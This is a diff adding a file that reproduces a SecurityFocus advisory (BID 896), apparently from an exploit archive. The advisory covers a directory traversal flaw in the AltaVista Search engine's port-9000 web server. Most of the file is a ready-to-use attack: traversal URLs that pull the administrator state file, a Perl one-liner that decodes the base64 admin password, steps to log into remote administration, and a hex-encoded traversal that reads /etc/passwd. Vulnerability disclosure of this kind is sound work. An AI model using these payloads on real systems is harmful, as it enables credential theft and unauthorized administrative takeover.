@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/896/info
+
+The AltaVista Search engine sets up a webserver at port 9000 to listen for search queries. The main search function will accept a single '../' string in the query, providing access to all documents in the 'http' directory one level up. These documents contain various administrative information, including the password for the remote administration utility. The password is base-64 encoded, and can be easily restored to plaintext to give an attacker full remote administration abilities for the search engine. The webserver will accept multiple '../' strings if they are hex encoded, ie '%2e%2e%2f'.
+
+http://target:9000/cgi-bin/query?mss=../logs/mgtstate
+(to get the mgtstate file.)
+
+#!/usr/bin/perl
+use MIME::Base64;
+print decode_base64("$ARGV[0]"), "\n";
+(to unencode the username/password)
+
+http://target:9000/cgi-bin/mgt
+and enter the username/password to access the remote administration features
+
+or
+http://target:9000/cgi-bin/query?mss=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+to get the password file on a unix system
